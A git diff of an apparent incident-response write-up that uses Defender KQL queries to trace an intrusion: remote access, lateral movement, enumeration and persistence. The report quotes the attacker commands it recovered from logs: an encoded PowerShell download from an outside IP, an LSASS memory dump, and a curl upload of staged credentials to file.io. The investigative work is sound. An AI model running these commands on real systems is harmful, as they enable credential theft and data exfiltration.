@@ -180,10 +180,15 @@ DeviceLogonEvents
 | project Timestamp, DeviceName, AccountName, RemoteIP, LogonType
 | order by Timestamp desc
 ```
+
 Timestamp **2025-11-22T01:58:55.7325167Z** device “**azuki-sl**”  was accessed remotely from IP **159.26.106.98**
+
 <img width="820" height="738" alt="image" src="https://github.com/user-attachments/assets/6200313b-db6e-4f3e-b31a-8ee5f9cc5995" />
+
 **Query 2 - Lateral Movement**
+
 Checked for lateral movement:
+
 ```
 let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
 let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
@@ -192,6 +197,7 @@ DeviceProcessEvents
 | where ProcessCommandLine contains "mstsc.exe"
 //| project Timestamp, DeviceName, AccountName, ProcessCommandLine
 | order by Timestamp desc
+
 ```
 <img width="820" height="577" alt="image" src="https://github.com/user-attachments/assets/64690d60-984d-42d6-86eb-2fb5e6d99fa3" />
 
@@ -208,36 +214,57 @@ DeviceProcessEvents
 
 ```
 Found activities from “azuki-fileserver01” and “azuki-sl”.
-<img width="822" height="739" alt="image" src="https://github.com/user-attachments/assets/a09607ed-106a-4377-8799-4de709c823e2" />
+
+
+<img width="650" height="450" alt="image" src="https://github.com/user-attachments/assets/a09607ed-106a-4377-8799-4de709c823e2" />
+
+
 I refined the query to include the AccountName “admin” since the name of the server suggests it would be used by an administrator.
-<img width="1065" height="708" alt="image" src="https://github.com/user-attachments/assets/85c2d107-a98a-4717-9887-e5dd5585d59f" />
+
+
+<img width="850" height="450" alt="image" src="https://github.com/user-attachments/assets/85c2d107-a98a-4717-9887-e5dd5585d59f" />
+
+
 Timeline **2025-11-22T01:03:55.6767092Z**: Suspicious **powesrhell process** was created. The location for the path is also suspicious “**C:\Windows\Logs\CBS\ex.ps1**”
 Command:
+
 ```
 "powershell.exe" -ExecutionPolicy Bypass -File C:\Windows\Logs\CBS\ex.ps1
+
 ```
+
 ```
 InitiatingProcessRemoteSessionDeviceName: AZUKI-SL
 InitiatingProcessRemoteSessionIP: 10.1.0.204
+
 ```
+
 Confirming the script was executed remotely from azuki-sl
+
 <img width="373" height="228" alt="image" src="https://github.com/user-attachments/assets/da8ea1f6-201a-4d98-9257-179ddfd991ba" /> <img width="316" height="396" alt="image" src="https://github.com/user-attachments/assets/19ad2ed9-9a18-4310-aa3c-ec3f11c82e21" />
 
+
 Note: Multi-stage powershell pivoting:
+
 ```
 powershell.exe (PID 2932) -> powershell.exe (PID 6904)
 ```
+
 Timestamp **2025-11-22T02:04:43.7036166Z**: A **hidden powershell command** was executed which is partially encrypted:
+
 ```
 "powershell.exe" -NoP -NonI -W Hidden -Exec Bypass -Enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwA3ADgALgAxADQAMQAuADEAOQA2AC4ANgA6ADgAMAA4ADAALwBTAHYAYwBoAG8AcwB0AC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHMAdgBjAGgAbwBzAHQALgBwAHMAMQAiAA==
 
 ```
-<img width="820" height="510" alt="image" src="https://github.com/user-attachments/assets/13ee43bf-2b3c-4fa7-95c7-f2a1e4295e5c" />
+
+<img width="520" height="450" alt="image" src="https://github.com/user-attachments/assets/13ee43bf-2b3c-4fa7-95c7-f2a1e4295e5c" />
 
 **Query 4**
-Powershell commands
+
+Powershell commands:
 
 ```
+
 let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
 let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
 DeviceProcessEvents
@@ -255,7 +282,7 @@ Timeline **2025-11-22T02:11:13.892171Z** PowerShell command executed:
 "powershell.exe" -NoP -W Hidden -File C:\Windows\System32\svchost.ps1
 
 ```
-<img width="854" height="516" alt="image" src="https://github.com/user-attachments/assets/74f3b089-7914-49d6-935b-fa54a9c495ae" />
+<img width="650" height="450" alt="image" src="https://github.com/user-attachments/assets/74f3b089-7914-49d6-935b-fa54a9c495ae" />
 
 **Query 5**
 Fine-tuned the query to check for Enumeration commands:
@@ -269,8 +296,10 @@ DeviceProcessEvents
 | order by Timestamp asc
 
 ```
-Timestamp **2025-11-22T00:40:33.3168699Z**: First enumeration from the “**azuki-fileserver01**” machine by user “**fileadmin**”. The commands were executed using the net.exe command “**net.exe ” user**, followed by other commands
-<img width="1856" height="253" alt="image" src="https://github.com/user-attachments/assets/18debad4-f396-4e47-b9ee-1fa5d9fb5df4" />
+Timestamp **2025-11-22T00:40:33.3168699Z**: First enumeration from the “**azuki-fileserver01**” machine by user “**fileadmin**”. The commands were executed using the net.exe command “**net.exe ” user**, followed by other commands.
+
+<img width="850" height="253" alt="image" src="https://github.com/user-attachments/assets/18debad4-f396-4e47-b9ee-1fa5d9fb5df4" />
+
 **Query 6**
 Checked for user privilege enumeration:
 
@@ -284,12 +313,15 @@ DeviceProcessEvents
 | order by Timestamp asc
 
 ```
+
 Timestamp **2025-11-22T00:40:09.3456568Z** “**whoami**” command was initiated on **fileserver01** remotely from device **azuki-sl** and user **fileadmin**.
 
-<img width="750" height="635" alt="image" src="https://github.com/user-attachments/assets/dd9b04c0-58ec-4f5b-97a6-bf8a72876375" />
-<img width="825" height="277" alt="image" src="https://github.com/user-attachments/assets/83ed861e-d713-47a1-ac7c-648c40878e68" />
+<img width="550" height="635" alt="image" src="https://github.com/user-attachments/assets/dd9b04c0-58ec-4f5b-97a6-bf8a72876375" />
 
-**Query 7** - Network Enumeration
+<img width="525" height="277" alt="image" src="https://github.com/user-attachments/assets/83ed861e-d713-47a1-ac7c-648c40878e68" />
+
+**Query 7** - Network Enumeration:
+
 ```
 let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
 let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
@@ -301,9 +333,11 @@ DeviceProcessEvents
 
 ```
 Timestamp **2025-11-22T00:42:46.3655894Z**: " **ipconfig / all** " command executed on **fileserver01 remotely** from **azuki-sl** and user **fileadmin**.
-<img width="750" height="672" alt="image" src="https://github.com/user-attachments/assets/0eaade7c-b652-46c4-a8b3-41b59d12c0af" />
+
+<img width="550" height="450" alt="image" src="https://github.com/user-attachments/assets/0eaade7c-b652-46c4-a8b3-41b59d12c0af" />
 
 **Query 8** - Attacker Staging Directories:
+
 ```
 let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
 let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
@@ -320,8 +354,10 @@ Command:
 ```
 "attrib.exe" +h +s C:\Windows\Logs\CBS
 ```
+
 This attempts to hide the path: "**C:\Windows\Logs\CBS**"
-<img width="750" height="652" alt="image" src="https://github.com/user-attachments/assets/f609ffb2-ec49-4685-ba6a-a63cdaeeefd6" />
+
+<img width="550" height="450" alt="image" src="https://github.com/user-attachments/assets/f609ffb2-ec49-4685-ba6a-a63cdaeeefd6" />
 
 **Query 9** - File Downloads
 
@@ -338,7 +374,8 @@ DeviceProcessEvents
 
 ```
 Timestamp **2025-11-22T00:56:47.4100711Z**: “**certutil**” command was executed on **azuki-fileserver01** by account name **fileadmin** to download a file ending “**ps1**” which is a **powershell extension**.
-<img width="1119" height="704" alt="image" src="https://github.com/user-attachments/assets/2ac04d47-c9ef-4af3-b8c0-80aa2cdceb08" />
+
+<img width="750" height="400" alt="image" src="https://github.com/user-attachments/assets/2ac04d47-c9ef-4af3-b8c0-80aa2cdceb08" />
 
 **Query 10** - Check for Exfiltration of Credentials
 
@@ -356,7 +393,8 @@ DeviceFileEvents
 
 ```
 Timestamp **2025-11-22T01:07:53.6746323Z**: “**IT-Admin-Passwords.csv**” file was created, presumably to store harvested credentials.
-<img width="1126" height="685" alt="image" src="https://github.com/user-attachments/assets/996fb6d7-2353-454e-a073-e6b3e6905c4b" />
+
+<img width="850" height="485" alt="image" src="https://github.com/user-attachments/assets/996fb6d7-2353-454e-a073-e6b3e6905c4b" />
 
 **Query 11** - Check for Command Execution to stage data:
 
@@ -373,7 +411,8 @@ DeviceProcessEvents
 
 ```
 Timestamp **2025-11-22T01:07:53.6430063Z**: A command was executed to stage data from  a network share.
-<img width="1211" height="746" alt="image" src="https://github.com/user-attachments/assets/8c9f254e-85df-4c0e-96d5-f3246bff5266" />
+
+<img width="850" height="550" alt="image" src="https://github.com/user-attachments/assets/8c9f254e-85df-4c0e-96d5-f3246bff5266" />
 
 **Query 12** - Check for compressed files:
 
@@ -408,16 +447,79 @@ DeviceFileEvents
 
 ```
 Timestamp **2025-11-22T02:24:47.6967458Z**: credential dumping executable “**lsass.dmp**” was renamed to “**pd.exe**”
-<img width="1165" height="387" alt="image" src="https://github.com/user-attachments/assets/27b05bbd-48e7-4619-9e7c-9b40af2cbfe7" />
+
+<img width="750" height="387" alt="image" src="https://github.com/user-attachments/assets/27b05bbd-48e7-4619-9e7c-9b40af2cbfe7" />
 
 The file was renamed in addition to the command to dump process memnory for credential extraction.
 Command used:
+
 ```
 "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
 
 ```
 
+**Query 14** - Checks for Data Exfiltration:
 
+```
+let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
+let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
+DeviceNetworkEvents
+| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
+| where ActionType == "ConnectionSuccess"
+| where RemoteIPType == "Public" 
+| extend icmd = tolower(InitiatingProcessCommandLine)
+| where icmd has_any (@"C:\Windows\Logs\CBS", "curl.exe", "certutil")
+| project Timestamp, DeviceName, InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl,
+          InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp desc
+
+```
+Timestamp **2025-11-22T01:59:54.4790127Z**: command was executed to exfiltrate staged data by uploading to an external url “**file.io**”
+Command used:
+
+```
+"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
+
+```
+
+<img width="550" height="450" alt="image" src="https://github.com/user-attachments/assets/f0f69e3c-f0f2-415f-a1cd-f733a6bccf8f" />
+
+**Query 15** - Check Registry changes for Signs of Persistence
+
+```
+let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
+let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
+DeviceRegistryEvents
+| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
+| where DeviceName == "azuki-fileserver01"
+| where InitiatingProcessAccountName == "fileadmin"
+
+```
+Timestamp **2025-11-22T02:10:50.8253766Z**: Registry value was set for persistence with a filename “**svchost.ps1**” as  beacon. The command used was:
+
+```
+#Registry key
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+#Value Name
+FileShareSync
+#Value data
+powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1
+
+```
+<img width="450" height="371" alt="image" src="https://github.com/user-attachments/assets/4049e563-08fe-465b-9ca2-7fcb8b1b078d" />
+
+**Query 16** - Anti-Forensics
+```
+
+let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
+let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
+DeviceFileEvents
+| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
+| where InitiatingProcessAccountName == "fileadmin"
+| where ActionType == "FileDeleted"
+| order by Timestamp desc
+
+```
 
 
 **Report Prepared By:**
